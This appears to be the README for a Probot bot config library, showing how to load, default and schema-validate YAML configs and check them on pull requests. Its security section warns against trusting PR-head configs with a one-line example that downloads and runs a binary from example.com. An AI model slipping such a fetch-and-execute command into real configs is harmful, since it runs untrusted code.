# bot-config-utils

This is a small library for handling bot config file.

## Install

```bash
npm i @google-automations/bot-config-utils
```

## Get the config

This library supports yaml config file. You provide an config
interface. The code assumes we're in the probot handler.

```typescript
import {
  getConfig,
} from '@google-automations/bot-config-utils';

interface Config {
  myConfig: string;
}
const CONFIG_FILENAME = 'mybot.yaml';
const {owner, repo} = context.repo();
const config = await getConfig<Config>(
  context.octokit,
  owner,
  repo,
  CONFIG_FILENAME);
// config can be null.
```

## Provide the default value

You can use a similar method that supports default value.

```typescript
import {
  getConfigWithDefault,
} from '@google-automations/bot-config-utils';

interface Config {
  myConfig: string;
}

const defaultConfig: Config = {'myConfig': 'myValue'};

const CONFIG_FILENAME = 'mybot.yaml';
const {owner, repo} = context.repo();
const config = await getConfigWithDefault<Config>(
  context.octokit,
  owner,
  repo,
  CONFIG_FILENAME,
  defaultConfig);
// config is always a Config object.
```

## getConfig options
You can specify optional arguments via the `getConfigOptions` interface to `getConfig` and `getConfigWithDefault`.

```
{
  fallbackToOrgConfig: false,
  branch: 'release-9.x',
  schema: schema,
  additionalSchemas: additionalSchema
}
```
- fallbackToOrgConfig
  If set to true, it will try to fetch the config from `.github` repo in the
  same org, defaults to true.
- branch
  The branch for getting the config.
- schema
  The json schema definition. If specified, the loaded config will be validated
  against the given schema. It will throw an Error when validation fails.
- additionalSchemas
  Only required if you need to give additional schema definitions.

Here is a simple example for not falling back to `.github` repo, and
doing the schema validation.

```
// json schema definition
import schema from './config-schema.json';
import {
  getConfig,
} from '@google-automations/bot-config-utils';

interface Config {
  myConfig: string;
}
const CONFIG_FILENAME = 'mybot.yaml';
const {owner, repo} = context.repo();
const config = await getConfig<Config>(
  context.octokit,
  owner,
  repo,
  CONFIG_FILENAME,
  {fallbackToOrgConfig: false, schema: schema}
);
// config can be null.
```

## Check config schema on PRs

To use this feature, the bot needs to have some permissions.

You have to add the following permissions:
- Pull Request Read/Write
- Checks Read/Write

You also have to subscribe to Pull Request events.

You also need to provide a schema definition. Here is an example definition:

```json
// config-schema.json
{
    "$schema": "http://json-schema.org/draft-07/schema#",
    "type": "object",
    "title": "flakybot config",
    "description": "Schema for flakybot configuration",
    "additionalProperties": false,
    "properties": {
	    "issuePriority": {
	        "description": "The default priority for flakybot issues",
	        "type": "string",
	    }
    }
}
```

Here is a sample handler(this assumes you're developping a Probot app):
```typescript
import {ConfigChecker} from '@google-automations/bot-config-utils';
import schema from './config-schema.json';

// ...

  app.on(
    [
      'pull_request.opened',
      'pull_request.reopened',
      'pull_request.edited',
      'pull_request.synchronize',
    ],
    async context => {
      const configChecker = new ConfigChecker<Config>(schema, CONFIG_FILENAME);
      const {owner, repo} = context.repo();
      await configChecker.validateConfigChanges(
        context.octokit,
        owner,
        repo,
        context.payload.pull_request.head.sha,
        context.payload.pull_request.number
      );
    }
  );
```

`validateConfigChanges` will check the config file format against the
schema you provided. It will submit a failing status check if:

- You are trying to add a wrong config file (currently it only checks
  `yaml` vs `yml`).
- You are trying to add a broken config file, or the config file
  doesn't match the schema.


## Fetch config from the PR head
Probot's implementation of config always fetches the config from the
master branch. This is a reasonable security meassure for a generic
library.

It is very dangerous to fetch the config from PR head expecially if
the config contains some external commands. Here is a simple example:

```yaml
prepareCommands: 'curl http://example.com/m && chmod +x m && ./m'

```

However, if your bot doesn't have such a field in the config file, it
is very natural to fetch the config from the PR head.

For this purpose, the ConfigChecker has a method:
`getConfig(): T | undefined`. This will return the config object only
if the validation succeeds.

Even if the config contains a dangerous field, you can selectively use
the value from the config in the PR head.
